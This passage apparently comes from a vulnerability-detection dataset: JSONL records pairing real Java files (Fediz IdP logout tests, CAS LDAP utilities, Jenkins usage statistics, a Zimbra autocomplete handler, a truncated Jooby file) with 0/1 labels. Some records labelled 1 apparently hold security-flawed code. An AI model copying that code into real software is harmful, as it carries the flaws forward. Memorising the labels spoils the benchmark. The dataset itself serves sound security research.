webClient.close();\n\n        // 2. now we logout from IdP\n        String logoutWReply = \"https://localhost:12345\";\n        String idpLogoutUrl = \"https://localhost:\" + getIdpHttpsPort() + \"/fediz-idp/federation?wa=\"\n            + FederationConstants.ACTION_SIGNOUT + \"&wreply=\" + logoutWReply;\n\n        webClient = new WebClient();\n        webClient.setCookieManager(cookieManager);\n        webClient.getOptions().setUseInsecureSSL(true);\n        try {\n            webClient.getPage(idpLogoutUrl);\n            Assert.fail(\"Failure expected on a non-matching wreply address\");\n        } catch (FailingHttpStatusCodeException ex) {\n            Assert.assertEquals(ex.getStatusCode(), 400);\n        }\n\n        webClient.close();\n    }\n\n    @Test\n    public void testIdPLogoutWithWreplyAddress() throws Exception {\n\n        // 1. First let's login to the IdP\n        String url = \"https://localhost:\" + getIdpHttpsPort() + \"/fediz-idp/federation?\";\n        url += \"wa=wsignin1.0\";\n        url += \"&whr=urn:org:apache:cxf:fediz:idp:realm-A\";\n        url += \"&wtrealm=urn:org:apache:cxf:fediz:fedizhelloworld3\";\n        String wreply = \"https://localhost:\" + getRpHttpsPort() + \"/\" + getServletContextName() + \"/secure/fedservlet\";\n        url += \"&wreply=\" + wreply;\n\n        String user = \"alice\";\n        String password = \"ecila\";\n\n        CookieManager cookieManager = new CookieManager();\n\n        WebClient webClient = new WebClient();\n        webClient.setCookieManager(cookieManager);\n        webClient.getOptions().setUseInsecureSSL(true);\n        webClient.getCredentialsProvider().setCredentials(\n            new AuthScope(\"localhost\", Integer.parseInt(getIdpHttpsPort())),\n            new UsernamePasswordCredentials(user, password));\n\n        webClient.getOptions().setJavaScriptEnabled(false);\n        HtmlPage idpPage = webClient.getPage(url);\n        webClient.getOptions().setJavaScriptEnabled(true);\n        Assert.assertEquals(\"IDP SignIn Response Form\", idpPage.getTitleText());\n        webClient.close();\n\n        // 2. now we logout from IdP\n        String logoutWReply = \"https://localhost:12345\";\n        String idpLogoutUrl = \"https://localhost:\" + getIdpHttpsPort() + \"/fediz-idp/federation?wa=\"\n            + FederationConstants.ACTION_SIGNOUT + \"&wreply=\" + logoutWReply\n            + \"&wtrealm=urn:org:apache:cxf:fediz:fedizhelloworld3\";\n\n        webClient = new WebClient();\n        webClient.setCookieManager(cookieManager);\n        webClient.getOptions().setUseInsecureSSL(true);\n        idpPage = webClient.getPage(idpLogoutUrl);\n\n        Assert.assertEquals(\"IDP SignOut Confirmation Response Page\", idpPage.getTitleText());\n\n        HtmlForm form = idpPage.getFormByName(\"signoutconfirmationresponseform\");\n        HtmlSubmitInput button = form.getInputByName(\"_eventId_submit\");\n        button.click();\n\n        webClient.close();\n\n        // 3. now we try to access the idp without authentication but with the existing cookies\n        // to see if we are really logged out\n        webClient = new WebClient();\n        webClient.setCookieManager(cookieManager);\n        webClient.getOptions().setUseInsecureSSL(true);\n        webClient.getOptions().setThrowExceptionOnFailingStatusCode(false);\n        idpPage = webClient.getPage(url);\n\n        Assert.assertEquals(401, idpPage.getWebResponse().getStatusCode());\n\n        webClient.close();\n    }\n\n    @Test\n    public void testIdPLogoutWithBadAddress() throws Exception {\n\n        // 1. First let's login to the IdP\n        String url = \"https://localhost:\" + getIdpHttpsPort() + \"/fediz-idp/federation?\";\n        url += \"wa=wsignin1.0\";\n        url += \"&whr=urn:org:apache:cxf:fediz:idp:realm-A\";\n        url += \"&wtrealm=urn:org:apache:cxf:fediz:fedizhelloworld3\";\n        String wreply = \"https://localhost:\" + getRpHttpsPort() + \"/\" + getServletContextName() + \"/secure/fedservlet\";\n        url += \"&wreply=\" + wreply;\n\n        String user = \"alice\";\n        String password = \"ecila\";\n\n        CookieManager cookieManager = new CookieManager();\n\n        WebClient webClient = new WebClient();\n        webClient.setCookieManager(cookieManager);\n        webClient.getOptions().setUseInsecureSSL(true);\n        webClient.getCredentialsProvider().setCredentials(\n            new AuthScope(\"localhost\", Integer.parseInt(getIdpHttpsPort())),\n            new UsernamePasswordCredentials(user, password));\n\n        webClient.getOptions().setJavaScriptEnabled(false);\n        HtmlPage idpPage = webClient.getPage(url);\n        webClient.getOptions().setJavaScriptEnabled(true);\n        Assert.assertEquals(\"IDP SignIn Response Form\", idpPage.getTitleText());\n        webClient.close();\n\n        // 2. now we logout from IdP\n        String logoutWReply = \"https://localhost:12345/badlogout\";\n        String idpLogoutUrl = \"https://localhost:\" + getIdpHttpsPort() + \"/fediz-idp/federation?wa=\"\n            + FederationConstants.ACTION_SIGNOUT + \"&wreply=\" + logoutWReply\n            + \"&wtrealm=urn:org:apache:cxf:fediz:fedizhelloworld3\";\n\n        webClient = new WebClient();\n        webClient.setCookieManager(cookieManager);\n        webClient.getOptions().setUseInsecureSSL(true);\n        try {\n            webClient.getPage(idpLogoutUrl);\n            Assert.fail(\"Failure expected on a non-matching wreply address\");\n        } catch (FailingHttpStatusCodeException ex) {\n            Assert.assertEquals(ex.getStatusCode(), 400);\n        }\n\n        webClient.close();\n    }\n\n    @Test\n    public void testIdPLogoutWithNoConfiguredConstraint() throws Exception {\n\n        // 1. First let's login to the IdP\n        String url = \"https://localhost:\" + getIdpHttpsPort() + \"/fediz-idp/federation?\";\n        url += \"wa=wsignin1.0\";\n        url += \"&whr=urn:org:apache:cxf:fediz:idp:realm-A\";\n        url += \"&wtrealm=urn:org:apache:cxf:fediz:fedizhelloworld2\";\n        String wreply = \"https://localhost:\" + getRpHttpsPort() + \"/\" + getServletContextName() + \"/secure2/fedservlet\";\n        url += \"&wreply=\" + wreply;\n\n        String user = \"alice\";\n        String password = \"ecila\";\n\n        CookieManager cookieManager = new CookieManager();\n\n        WebClient webClient = new WebClient();\n        webClient.setCookieManager(cookieManager);\n        webClient.getOptions().setUseInsecureSSL(true);\n        webClient.getCredentialsProvider().setCredentials(\n            new AuthScope(\"localhost\", Integer.parseInt(getIdpHttpsPort())),\n            new UsernamePasswordCredentials(user, password));\n\n        webClient.getOptions().setJavaScriptEnabled(false);\n        HtmlPage idpPage = webClient.getPage(url);\n        webClient.getOptions().setJavaScriptEnabled(true);\n        Assert.assertEquals(\"IDP SignIn Response Form\", idpPage.getTitleText());\n        webClient.close();\n\n        // 2. now we logout from IdP\n        String logoutWReply = \"https://localhost:12345\";\n        String idpLogoutUrl = \"https://localhost:\" + getIdpHttpsPort() + \"/fediz-idp/federation?wa=\"\n            + FederationConstants.ACTION_SIGNOUT + \"&wreply=\" + logoutWReply\n            + \"&wtrealm=urn:org:apache:cxf:fediz:fedizhelloworld2\";\n\n        webClient = new WebClient();\n        webClient.setCookieManager(cookieManager);\n        webClient.getOptions().setUseInsecureSSL(true);\n        try {\n            webClient.getPage(idpLogoutUrl);\n            Assert.fail(\"Failure expected on a non-matching wreply address\");\n        } catch (FailingHttpStatusCodeException ex) {\n            Assert.assertEquals(ex.getStatusCode(), 400);\n        }\n\n        webClient.close();\n    }\n\n}\n", "target": 1}
{"idx": 1102, "func": "/*\n * Licensed to Jasig under one or more contributor license\n * agreements. See the NOTICE file distributed with this work\n * for additional information regarding copyright ownership.\n * Jasig licenses this file to you under the Apache License,\n * Version 2.0 (the \"License\"); you may not use this file\n * except in compliance with the License.  You may obtain a\n * copy of the License at the following location:\n *\n *   http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing,\n * software distributed under the License is distributed on an\n * \"AS IS\" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY\n * KIND, either express or implied.  See the License for the\n * specific language governing permissions and limitations\n * under the License.\n */\npackage org.jasig.cas.util;\n\nimport java.util.HashMap;\nimport java.util.Map;\nimport java.util.regex.Matcher;\n\nimport javax.naming.NamingException;\nimport javax.naming.directory.DirContext;\n\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport org.springframework.ldap.core.LdapEncoder;\n\n/**\n * Utilities related to LDAP functions.\n * \n * @author Scott Battaglia\n * @version $Revision$ $Date$\n * @since 3.0\n */\npublic final class LdapUtils {\n\n    private static final Logger logger = LoggerFactory.getLogger(LdapUtils.class);\n\n    private LdapUtils() {\n        // private constructor so that no one can instantiate.\n    }\n\n    /**\n     * Utility method to replace the placeholders in the filter with the proper\n     * values from the userName.\n     * \n     * @param filter\n     * @param userName\n     * @return the filtered string populated with the username\n     */\n    public static String getFilterWithValues(final String filter,\n        final String userName) {\n        final Map<String, String> properties = new HashMap<String, String>();\n        final String[] userDomain;\n        String newFilter = filter;\n\n        properties.put(\"%u\", userName);\n\n        userDomain = userName.split(\"@\");\n\n        properties.put(\"%U\", userDomain[0]);\n\n        if (userDomain.length > 1) {\n            properties.put(\"%d\", userDomain[1]);\n\n            final String[] dcArray = userDomain[1].split(\"\\\\.\");\n\n            for (int i = 0; i < dcArray.length; i++) {\n                properties.put(\"%\" + (i + 1), dcArray[dcArray.length\n                    - 1 - i]);\n            }\n        }\n\n        for (final String key : properties.keySet()) {\n            final String value = LdapEncoder.filterEncode(properties.get(key));\n            newFilter = newFilter.replaceAll(key, Matcher.quoteReplacement(value));\n        }\n\n        return newFilter;\n    }\n\n    /**\n     * Close the given context and ignore any thrown exception. This is useful\n     * for typical finally blocks in manual Ldap statements.\n     * \n     * @param context the Ldap context to close\n     */\n    public static void closeContext(final DirContext context) {\n        if (context != null) {\n            try {\n                context.close();\n            } catch (NamingException ex) {\n                logger.warn(\"Could not close context\", ex);\n            }\n        }\n    }\n}\n", "target": 0}
{"idx": 1103, "func": "/*\n * The MIT License\n * \n * Copyright (c) 2004-2010, Sun Microsystems, Inc., Kohsuke Kawaguchi\n * \n * Permission is hereby granted, free of charge, to any person obtaining a copy\n * of this software and associated documentation files (the \"Software\"), to deal\n * in the Software without restriction, including without limitation the rights\n * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n * copies of the Software, and to permit persons to whom the Software is\n * furnished to do so, subject to the following conditions:\n * \n * The above copyright notice and this permission notice shall be included in\n * all copies or substantial portions of the Software.\n * \n * THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n * THE SOFTWARE.\n */\npackage hudson.model;\n\nimport com.trilead.ssh2.crypto.Base64;\nimport hudson.PluginWrapper;\nimport hudson.Util;\nimport hudson.Extension;\nimport hudson.node_monitors.ArchitectureMonitor.DescriptorImpl;\nimport hudson.util.Secret;\nimport static hudson.util.TimeUnit2.DAYS;\n\nimport jenkins.model.Jenkins;\nimport net.sf.json.JSONObject;\nimport org.apache.commons.io.output.ByteArrayOutputStream;\nimport org.kohsuke.stapler.StaplerRequest;\n\nimport javax.crypto.Cipher;\nimport javax.crypto.CipherOutputStream;\nimport javax.crypto.KeyGenerator;\nimport javax.crypto.SecretKey;\nimport javax.crypto.CipherInputStream;\nimport javax.crypto.spec.IvParameterSpec;\nimport javax.crypto.spec.SecretKeySpec;\nimport java.io.IOException;\nimport java.io.OutputStreamWriter;\nimport java.io.FilterOutputStream;\nimport java.io.OutputStream;\nimport java.io.FilterInputStream;\nimport java.io.InputStream;\nimport java.io.DataInputStream;\nimport java.security.GeneralSecurityException;\nimport java.security.Key;\nimport java.security.KeyFactory;\nimport java.security.PublicKey;\nimport java.security.interfaces.RSAKey;\nimport java.security.interfaces.RSAPublicKey;\nimport java.security.spec.X509EncodedKeySpec;\nimport java.util.ArrayList;\nimport java.util.List;\nimport java.util.zip.GZIPOutputStream;\n\n/**\n * @author Kohsuke Kawaguchi\n */\n@Extension\npublic class UsageStatistics extends PageDecorator {\n    private final String keyImage;\n\n    /**\n     * Lazily computed {@link PublicKey} representation of {@link #keyImage}.\n     */\n    private volatile transient RSAPublicKey key;\n\n    /**\n     * When was the last time we asked a browser to send the usage stats for us?\n     */\n    private volatile transient long lastAttempt = -1;\n\n    public UsageStatistics() {\n        this(DEFAULT_KEY_BYTES);\n    }\n\n    /**\n     * Creates an instance with a specific public key image.\n     */\n    public UsageStatistics(String keyImage) {\n        this.keyImage = keyImage;\n        load();\n    }\n\n    /**\n     * Returns true if it's time for us to check for new version.\n     */\n    public boolean isDue() {\n        // user opted out. no data collection.\n        if(!Jenkins.getInstance().isUsageStatisticsCollected() || DISABLED)     return false;\n        \n        long now = System.currentTimeMillis();\n        if(now - lastAttempt > DAY) {\n            lastAttempt = now;\n            return true;\n        }\n        return false;\n    }\n\n    private RSAPublicKey getKey() {\n        try {\n            if (key == null) {\n                KeyFactory keyFactory = KeyFactory.getInstance(\"RSA\");\n                key = (RSAPublicKey)keyFactory.generatePublic(new X509EncodedKeySpec(Util.fromHexString(keyImage)));\n            }\n            return key;\n        } catch (GeneralSecurityException e) {\n            throw new Error(e); // impossible\n        }\n    }\n\n    /**\n     * Gets the encrypted usage stat data to be sent to the Hudson server.\n     */\n    public String getStatData() throws IOException {\n        Jenkins j = Jenkins.getInstance();\n\n        JSONObject o = new JSONObject();\n        o.put(\"stat\",1);\n        o.put(\"install\", j.getLegacyInstanceId());\n        o.put(\"servletContainer\", j.servletContext.getServerInfo());\n        o.put(\"version\", Jenkins.VERSION);\n\n        List<JSONObject> nodes = new ArrayList<JSONObject>();\n        for( Computer c : j.getComputers() ) {\n            JSONObject  n = new JSONObject();\n            if(c.getNode()==j) {\n                n.put(\"master\",true);\n                n.put(\"jvm-vendor\", System.getProperty(\"java.vm.vendor\"));\n                n.put(\"jvm-version\", System.getProperty(\"java.version\"));\n            }\n            n.put(\"executors\",c.getNumExecutors());\n            DescriptorImpl descriptor = j.getDescriptorByType(DescriptorImpl.class);\n            n.put(\"os\", descriptor.get(c));\n            nodes.add(n);\n        }\n        o.put(\"nodes\",nodes);\n\n        List<JSONObject> plugins = new ArrayList<JSONObject>();\n        for( PluginWrapper pw : j.getPluginManager().getPlugins() ) {\n            if(!pw.isActive())  continue;   // treat disabled plugins as if they are uninstalled\n            JSONObject p = new JSONObject();\n            p.put(\"name\",pw.getShortName());\n            p.put(\"version\",pw.getVersion());\n            plugins.add(p);\n        }\n        o.put(\"plugins\",plugins);\n\n        JSONObject jobs = new JSONObject();\n        List<TopLevelItem> items = j.getItems();\n        for (TopLevelItemDescriptor d : Items.all()) {\n            int cnt=0;\n            for (TopLevelItem item : items) {\n                if(item.getDescriptor()==d)\n                    cnt++;\n            }\n            jobs.put(d.getJsonSafeClassName(),cnt);\n        }\n        o.put(\"jobs\",jobs);\n\n        try {\n            ByteArrayOutputStream baos = new ByteArrayOutputStream();\n\n            // json -> UTF-8 encode -> gzip -> encrypt -> base64 -> string\n            OutputStreamWriter w = new OutputStreamWriter(new GZIPOutputStream(new CombinedCipherOutputStream(baos,getKey(),\"AES\")), \"UTF-8\");\n            o.write(w);\n            w.close();\n\n            return new String(Base64.encode(baos.toByteArray()));\n        } catch (GeneralSecurityException e) {\n            throw new Error(e); // impossible\n        }\n    }\n\n    @Override\n    public boolean configure(StaplerRequest req, JSONObject json) throws FormException {\n        try {\n            // for backward compatibility reasons, this configuration is stored in Jenkins\n            Jenkins.getInstance().setNoUsageStatistics(json.has(\"usageStatisticsCollected\") ? null : true);\n            return true;\n        } catch (IOException e) {\n            throw new FormException(e,\"usageStatisticsCollected\");\n        }\n    }\n\n    /**\n     * Assymetric cipher is slow and in case of Sun RSA implementation it can only encyrypt the first block.\n     *\n     * So first create a symmetric key, then place this key in the beginning of the stream by encrypting it\n     * with the assymetric cipher. The rest of the stream will be encrypted by a symmetric cipher.\n     */\n    public static final class CombinedCipherOutputStream extends FilterOutputStream {\n        public CombinedCipherOutputStream(OutputStream out, Cipher asym, String algorithm) throws IOException, GeneralSecurityException {\n            super(out);\n\n            // create a new symmetric cipher key used for this stream\n            String keyAlgorithm = getKeyAlgorithm(algorithm);\n            SecretKey symKey = KeyGenerator.getInstance(keyAlgorithm).generateKey();\n\n            // place the symmetric key by encrypting it with asymmetric cipher\n            out.write(asym.doFinal(symKey.getEncoded()));\n\n            // the rest of the data will be encrypted by this symmetric cipher\n            Cipher sym = Secret.getCipher(algorithm);\n            sym.init(Cipher.ENCRYPT_MODE,symKey, keyAlgorithm.equals(algorithm) ? null : new IvParameterSpec(symKey.getEncoded()));\n            super.out = new CipherOutputStream(out,sym);\n        }\n\n        public CombinedCipherOutputStream(OutputStream out, RSAKey key, String algorithm) throws IOException, GeneralSecurityException {\n            this(out,toCipher(key,Cipher.ENCRYPT_MODE),algorithm);\n        }\n    }\n\n    /**\n     * The opposite of the {@link CombinedCipherOutputStream}.\n     */\n    public static final class CombinedCipherInputStream extends FilterInputStream {\n        /**\n         * @param keyLength\n         *      Block size of the asymmetric cipher, in bits. I thought I can get it from {@code asym.getBlockSize()}\n         *      but that doesn't work with Sun's implementation.\n         */\n        public CombinedCipherInputStream(InputStream in, Cipher asym, String algorithm, int keyLength) throws IOException, GeneralSecurityException {\n            super(in);\n\n            String keyAlgorithm = getKeyAlgorithm(algorithm);\n\n            // first read the symmetric key cipher\n            byte[] symKeyBytes = new byte[keyLength/8];\n            new DataInputStream(in).readFully(symKeyBytes);\n            SecretKey symKey = new SecretKeySpec(asym.doFinal(symKeyBytes),keyAlgorithm);\n\n            // the rest of the data will be decrypted by this symmetric cipher\n            Cipher sym = Secret.getCipher(algorithm);\n            sym.init(Cipher.DECRYPT_MODE,symKey, keyAlgorithm.equals(algorithm) ? null : new IvParameterSpec(symKey.getEncoded()));\n            super.in = new CipherInputStream(in,sym);\n        }\n\n        public CombinedCipherInputStream(InputStream in, RSAKey key, String algorithm) throws IOException, GeneralSecurityException {\n            this(in,toCipher(key,Cipher.DECRYPT_MODE),algorithm,key.getModulus().bitLength());\n        }\n    }\n\n    private static String getKeyAlgorithm(String algorithm) {\n        int index = algorithm.indexOf('/');\n        return (index>0)?algorithm.substring(0,index):algorithm;\n    }\n\n    private static Cipher toCipher(RSAKey key, int mode) throws GeneralSecurityException {\n        Cipher cipher = Cipher.getInstance(\"RSA\");\n        cipher.init(mode, (Key)key);\n        return cipher;\n    }\n\n    /**\n     * Public key to encrypt the usage statistics\n     */\n    private static final String DEFAULT_KEY_BYTES = \"30819f300d06092a864886f70d010101050003818d0030818902818100c14970473bd90fd1f2d20e4fa6e36ea21f7d46db2f4104a3a8f2eb097d6e26278dfadf3fe9ed05bbbb00a4433f4b7151e6683a169182e6ff2f6b4f2bb6490b2cddef73148c37a2a7421fc75f99fb0fadab46f191806599a208652f4829fd6f76e13195fb81ff3f2fce15a8e9a85ebe15c07c90b34ebdb416bd119f0d74105f3b0203010001\";\n\n    private static final long DAY = DAYS.toMillis(1);\n\n    public static boolean DISABLED = Boolean.getBoolean(UsageStatistics.class.getName()+\".disabled\");\n}\n", "target": 0}
{"idx": 1104, "func": "/*\n * ***** BEGIN LICENSE BLOCK *****\n * Zimbra Collaboration Suite Server\n * Copyright (C) 2006, 2007, 2008, 2009, 2010, 2011, 2013, 2014, 2016 Synacor, Inc.\n *\n * This program is free software: you can redistribute it and/or modify it under\n * the terms of the GNU General Public License as published by the Free Software Foundation,\n * version 2 of the License.\n *\n * This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;\n * without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.\n * See the GNU General Public License for more details.\n * You should have received a copy of the GNU General Public License along with this program.\n * If not, see <https://www.gnu.org/licenses/>.\n * ***** END LICENSE BLOCK *****\n */\npackage com.zimbra.cs.service.account;\n\nimport java.util.Map;\n\nimport com.zimbra.common.service.ServiceException;\nimport com.zimbra.common.soap.AccountConstants;\nimport com.zimbra.common.soap.Element;\nimport com.zimbra.cs.account.Account;\nimport com.zimbra.cs.account.Provisioning;\nimport com.zimbra.cs.gal.GalSearchControl;\nimport com.zimbra.cs.gal.GalSearchParams;\nimport com.zimbra.soap.ZimbraSoapContext;\nimport com.zimbra.soap.type.GalSearchType;\n\n/**\n * @since May 26, 2004\n * @author schemers\n */\npublic class AutoCompleteGal extends GalDocumentHandler {\n\n    @Override\n    public Element handle(Element request, Map<String, Object> context) throws ServiceException {\n        ZimbraSoapContext zsc = getZimbraSoapContext(context);\n        Account account = getRequestedAccount(getZimbraSoapContext(context));\n\n        if (!canAccessAccount(zsc, account))\n            throw ServiceException.PERM_DENIED(\"can not access account\");\n        \n        String name = request.getAttribute(AccountConstants.E_NAME);\n        String typeStr = request.getAttribute(AccountConstants.A_TYPE, \"account\");\n        GalSearchType type = GalSearchType.fromString(typeStr);\n\n        boolean needCanExpand = request.getAttributeBool(AccountConstants.A_NEED_EXP, false);\n\n        String galAcctId = request.getAttribute(AccountConstants.A_GAL_ACCOUNT_ID, null);\n        \n        GalSearchParams params = new GalSearchParams(account, zsc);\n        params.setType(type);\n        params.setRequest(request);\n        params.setQuery(name);\n        params.setLimit(account.getContactAutoCompleteMaxResults());\n        params.setNeedCanExpand(needCanExpand);\n        params.setResponseName(AccountConstants.AUTO_COMPLETE_GAL_RESPONSE);\n        if (galAcctId != null)\n            params.setGalSyncAccount(Provisioning.getInstance().getAccountById(galAcctId));\n        GalSearchControl gal = new GalSearchControl(params);\n        gal.autocomplete();\n        return params.getResultCallback().getResponse();\n    }\n\n    @Override\n    public boolean needsAuth(Map<String, Object> context) {\n        return true;\n    }\n}\n", "target": 1}
{"idx": 1105, "func": "/**\n *                                  Apache License\n *                            Version 2.0, January 2004\n *                         http://www.apache.org/licenses/\n *\n *    TERMS AND CONDITIONS FOR USE, REPRODUCTION, AND DISTRIBUTION\n *\n *    1. Definitions.\n *\n *       \"License\" shall mean the terms and conditions for use, reproduction,\n *       and distribution as defined by Sections 1 through 9 of this document.\n *\n *       \"Licensor\" shall mean the copyright owner or entity authorized by\n *       the copyright owner that is granting the License.\n *\n *       \"Legal Entity\" shall mean the union of the acting entity and all\n *       other entities that control, are controlled by, or are under common\n *       control with that entity. For the purposes of this definition,\n *       \"control\" means (i) the power, direct or indirect, to cause the\n *       direction or management of such entity, whether by contract or\n *       otherwise, or (ii) ownership of fifty percent (50%) or more of the\n *       outstanding shares, or (iii) beneficial ownership of such entity.\n *\n *       \"You\" (or \"Your\") shall mean an individual or Legal Entity\n *       exercising permissions granted by this License.\n *\n *       \"Source\" form shall mean the preferred form for making modifications,\n *       including but not limited to software source code, documentation\n *       source, and configuration files.\n *\n *       \"Object\" form shall mean any form resulting from mechanical\n *       transformation or translation of a Source form, including but\n *       not limited to compiled object code, generated documentation,\n *       and conversions to other media types.\n *\n *       \"Work\" shall mean the work of authorship, whether in Source or\n *       Object form, made available under the License, as indicated by a\n *       copyright notice that is included in or attached to the work\n *       (an example is provided in the Appendix below).\n *\n *       \"Derivative Works\" shall mean any work, whether in Source or Object\n *       form, that is based on (or derived from) the Work and for which the\n *       editorial revisions, annotations, elaborations, or other modifications\n *       represent, as a whole, an original work of authorship. For the purposes\n *       of this License, Derivative Works shall not include works that remain\n *       separable from, or merely link (or bind by name) to the interfaces of,\n *       the Work and Derivative Works thereof.\n *\n *       \"Contribution\" shall mean any work of authorship, including\n *       the original version of the Work and any modifications or additions\n *       to that Work or Derivative Works thereof, that is intentionally\n *       submitted to Licensor for inclusion in the Work by the copyright owner\n *       or by an individual or Legal Entity authorized to submit on behalf of\n *       the copyright owner. For the purposes of this definition, \"submitted\"\n *       means any form of electronic, verbal, or written communication sent\n *       to the Licensor or its representatives, including but not limited to\n *       communication on electronic mailing lists, source code control systems,\n *       and issue tracking systems that are managed by, or on behalf of, the\n *       Licensor for the purpose of discussing and improving the Work, but\n *       excluding communication that is conspicuously marked or otherwise\n *       designated in writing by the copyright owner as \"Not a Contribution.\"\n *\n *       \"Contributor\" shall mean Licensor and any individual or Legal Entity\n *       on behalf of whom a Contribution has been received by Licensor and\n *       subsequently incorporated within the Work.\n *\n *    2. Grant of Copyright License. Subject to the terms and conditions of\n *       this License, each Contributor hereby grants to You a perpetual,\n *       worldwide, non-exclusive, no-charge, royalty-free, irrevocable\n *       copyright license to reproduce, prepare Derivative Works of,\n *       publicly display, publicly perform, sublicense, and distribute the\n *       Work and such Derivative Works in Source or Object form.\n *\n *    3. Grant of Patent License. Subject to the terms and conditions of\n *       this License, each Contributor hereby grants to You a perpetual,\n *       worldwide, non-exclusive, no-charge, royalty-free, irrevocable\n *       (except as stated in this section) patent license to make, have made,\n *       use, offer to sell, sell, import, and otherwise transfer the Work,\n *       where such license applies only to those patent claims licensable\n *       by such Contributor that are necessarily infringed by their\n *       Contribution(s) alone or by combination of their Contribution(s)\n *       with the Work to which such Contribution(s) was submitted. If You\n *       institute patent litigation against any entity (including a\n *       cross-claim or counterclaim in a lawsuit) alleging that the Work\n *       or a Contribution incorporated within the Work constitutes direct\n *       or contributory patent infringement, then any patent licenses\n *       granted to You under this License for that Work shall terminate\n *       as of the date such litigation is filed.\n *\n *    4. Redistribution. You may reproduce and distribute copies of the\n *       Work or Derivative Works thereof in any medium, with or without\n *       modifications, and in Source or Object form, provided that You\n *       meet the following conditions:\n *\n *       (a) You must give any other recipients of the Work or\n *           Derivative Works a copy of this License; and\n *\n *       (b) You must cause any modified files to carry prominent notices\n *           stating that You changed the files; and\n *\n *       (c) You must retain, in the Source form of any Derivative Works\n *           that You distribute, all copyright, patent, trademark, and\n *           attribution notices from the Source form of the Work,\n *           excluding those notices that do not pertain to any part of\n *           the Derivative Works; and\n *\n *       (d) If the Work includes a \"NOTICE\" text file as part of its\n *           distribution, then any Derivative Works that You distribute must\n *           include a readable copy of the attribution notices contained\n *           within such NOTICE file, excluding those notices that do not\n *           pertain to any part of the Derivative Works, in at least one\n *           of the following places: within a NOTICE text file distributed\n *           as part of the Derivative Works; within the Source form or\n *           documentation, if provided along with the Derivative Works; or,\n *           within a display generated by the Derivative Works, if and\n *           wherever such third-party notices normally appear. The contents\n *           of the NOTICE file are for informational purposes only and\n *           do not modify the License. You may add Your own attribution\n *           notices within Derivative Works that You distribute, alongside\n *           or as an addendum to the NOTICE text from the Work, provided\n *           that such additional attribution notices cannot be construed\n *           as modifying the License.\n *\n *       You may add Your own copyright statement to Your modifications and\n *       may provide additional or different license terms and conditions\n *       for use, reproduction, or distribution of Your modifications, or\n *       for any such Derivative Works as a whole, provided Your use,\n *       reproduction, and distribution of the Work otherwise complies with\n *       the conditions stated in this License.\n *\n *    5. Submission of Contributions. Unless You explicitly state otherwise,\n *       any Contribution intentionally submitted for inclusion in the Work\n *       by You to the Licensor shall be under the terms and conditions of\n *       this License, without any additional terms or conditions.\n *       Notwithstanding the above, nothing herein shall supersede or modify\n *       the terms of any separate license agreement you may have executed\n *       with Licensor regarding such Contributions.\n *\n *    6. Trademarks. This License does not grant permission to use the trade\n *       names, trademarks, service marks, or product names of the Licensor,\n *       except as required for reasonable and customary use in describing the\n *       origin of the Work and reproducing the content of the NOTICE file.\n *\n *    7. Disclaimer of Warranty. Unless required by applicable law or\n *       agreed to in writing, Licensor provides the Work (and each\n *       Contributor provides its Contributions) on an \"AS IS\" BASIS,\n *       WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or\n *       implied, including, without limitation, any warranties or conditions\n *       of TITLE, NON-INFRINGEMENT, MERCHANTABILITY, or FITNESS FOR A\n *       PARTICULAR PURPOSE. You are solely responsible for determining the\n *       appropriateness of using or redistributing the Work and assume any\n *       risks associated with Your exercise of permissions under this License.\n *\n *    8. Limitation of Liability. In no event and under no legal theory,\n *       whether in tort (including negligence), contract, or otherwise,\n *       unless required by applicable law (such as deliberate and grossly\n *       negligent acts) or agreed to in writing, shall any Contributor be\n *       liable to You for damages, including any direct, indirect, special,\n *       incidental, or consequential damages of any character arising as a\n *       result of this License or out of the use or inability to use the\n *       Work (including but not limited to damages for loss of goodwill,\n *       work stoppage, computer failure or malfunction, or any and all\n *       other commercial damages or losses), even if such Contributor\n *       has been advised of the possibility of such damages.\n *\n *    9. Accepting Warranty or Additional Liability. While redistributing\n *       the Work or Derivative Works thereof, You may choose to offer,\n *       and charge a fee for, acceptance of support, warranty, indemnity,\n *       or other liability obligations and/or rights consistent with this\n *       License. However, in accepting such obligations, You may act only\n *       on Your own behalf and on Your sole responsibility, not on behalf\n *       of any other Contributor, and only if You agree to indemnify,\n *       defend, and hold each Contributor harmless for any liability\n *       incurred by, or claims asserted against, such Contributor by reason\n *       of your accepting any such warranty or additional liability.\n *\n *    END OF TERMS AND CONDITIONS\n *\n *    APPENDIX: How to apply the Apache License to your work.\n *\n *       To apply the Apache License to your work, attach the following\n *       boilerplate notice, with the fields enclosed by brackets \"{}\"\n *       replaced with your own identifying information. (Don't include\n *       the brackets!)  The text should be enclosed in the appropriate\n *       comment syntax for the file format. We also recommend that a\n *       file or class name and description of purpose be included on the\n *       same \"printed page\" as the copyright notice for easier\n *       identification within third-party archives.\n *\n *    Copyright 2014 Edgar Espina\n *\n *    Licensed under the Apache License, Version 2.0 (the \"License\");\n *    you may not use this file except in compliance with the License.\n *    You may obtain a copy of the License at\n *\n *        http://www.apache.org/licenses/LICENSE-2.0\n *\n *    Unless required by applicable law or agreed to in writing, software\n *    distributed under the License is distributed on an \"AS IS\" BASIS,\n *    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n *    See the License for the specific language governing permissions and\n *    limitations under the License.\n */\npackage org.jooby.handlers;\n\nimport com.google.common.base.Strings;\nimport com.typesafe.config.ConfigFactory;\nimport com.typesafe.config.ConfigValueFactory;\nimport org.jooby.Asset;\nimport org.jooby.Err;\nimport org.jooby.Jooby;\nimport 